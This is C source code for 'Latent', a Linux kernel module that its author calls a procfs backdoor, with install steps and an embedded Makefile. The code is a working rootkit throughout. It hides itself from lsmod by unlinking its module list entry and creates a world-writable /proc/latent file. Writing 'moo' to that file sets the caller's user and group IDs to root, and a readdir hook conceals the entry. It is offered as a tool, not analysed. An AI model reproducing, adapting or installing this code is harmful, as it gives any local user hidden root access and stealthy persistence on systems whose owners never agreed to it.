/* Latent.ko -- a procfs backdoor
 * Author: pasv (pasvninja[a-t]gmail.com)
 * 
 * Installation:
 * make
 * insmod ./latent.ko
 *
 * Usage:
 * echo moo > /proc/latent
 */

/*
---BEGIN Makefile---
# Comment/uncomment the following line to disable/enable debugging
DEBUG = y


# Add your debugging flag (or not) to CFLAGS
ifeq ($(DEBUG),y)
  DEBFLAGS = -O -g -DSHORT_DEBUG # "-O" is needed to expand inlines
else
  DEBFLAGS = -O2
endif

CFLAGS += -Wall
CFLAGS += $(DEBFLAGS)
CFLAGS += -I..

ifneq ($(KERNELRELEASE),)
# call from kernel build system

obj-m	:= latent.o

else

KERNELDIR ?= /lib/modules/$(shell uname -r)/build
PWD       := $(shell pwd)

default:
	$(MAKE) -C $(KERNELDIR) M=$(PWD) modules

endif


clean:
	rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions

depend .depend dep:
	$(CC) $(CFLAGS) -M *.c > .depend


ifeq (.depend,$(wildcard .depend))
include .depend
endif
--END Makefile-- 
*/

#include <linux/module.h>
#include <linux/string.h>
#include <linux/kernel.h>
#include <linux/dirent.h>
#include <linux/config.h>
#include <linux/types.h>
#include <linux/slab.h>
#include <linux/smp_lock.h>
#include <linux/fd.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <linux/sched.h>
#include <asm/uaccess.h>

int (*old_readdir) (struct file *, void *, filldir_t);
struct dentry *(*old_lookup)(struct inode *, struct dentry *, struct nameidata *);
filldir_t old_filldir;

/* Hides latent from lsmod */
void hide_module(void) {
	lock_kernel();
	__this_module.list.next->prev = __this_module.list.prev;
	__this_module.list.prev->next = __this_module.list.next;
	__this_module.list.next = LIST_POISON1;
	__this_module.list.prev = LIST_POISON2;
	unlock_kernel();
}

struct dentry *latent_lookup(struct inode *ino, struct dentry *den, struct nameidata *n) {
//	if(!strncmp("latent", den->d_name, 6)) return NULL;
	return (*old_lookup)(ino,den,n);
}

//static int latent_filldir(void *a, const char *b, int c, loff_t d, ino_t e, unsigned f) {
//	//if(!strncmp("latent",b,c)) return 0;
//	return old_filldir(a,b,c,d,e,f);
//}

int latent_readdir(struct file *file, void *blah, filldir_t filldir) {
	struct dirent *dirp;
	dirp=((struct dirent *)blah);
	if(!strncmp(dirp->d_name, "latent", 6))
	blah = blah + dirp->d_off;
	return (int) (*old_readdir)(file, blah, filldir);
}

int latent_write(struct file *file, const char __user *buffer, size_t count, loff_t *data) {
	//printk(KERN_ALERT "latent_write() hit\n");
        printk("~latent~:");
	printk(buffer);
	printk("\n");
	if(!strncmp(buffer,"moo",3)) {
		printk(KERN_ALERT "dropping privs\n");
 	        current->uid = 0;
                current->suid = 0;
                current->euid = 0;
                current->gid = 0;
                current->egid = 0;
                current->fsuid = 0;
                current->fsgid = 0;
	}
	
        return count;
}


int procfs_vector(void) {
	static struct proc_dir_entry *latent;
	latent=create_proc_entry("latent", 0777, &proc_root);
	old_readdir = proc_root.proc_fops->readdir;
	// old_lookup = proc_root.proc_iops->lookup;
	latent->proc_fops->write = &latent_write;
	proc_root.proc_fops->readdir = &latent_readdir; // not ready yet
	//proc_root.proc_iops->lookup = &latent_lookup;
	return 1;
}

static int latent_init(void) {
	printk(KERN_ALERT "~Latent~[+] Latent loaded\n~Latent~[] initiating stealth mode\n");
	hide_module();
	printk(KERN_ALERT "~Latent~[+] stealth mode initiated\n");
	printk(KERN_ALERT "~Latent~[] attacking procfs vector...\n");
	procfs_vector();
	printk(KERN_ALERT "~Latent~[+] procfs hooks enabled\n");
	return 0;
}

void latent_exit(void) {
	remove_proc_entry("latent", &proc_root);
	printk(KERN_ALERT "~Latent~[+] latent unloaded\n");
	return;
}

module_init(latent_init);
module_exit(latent_exit);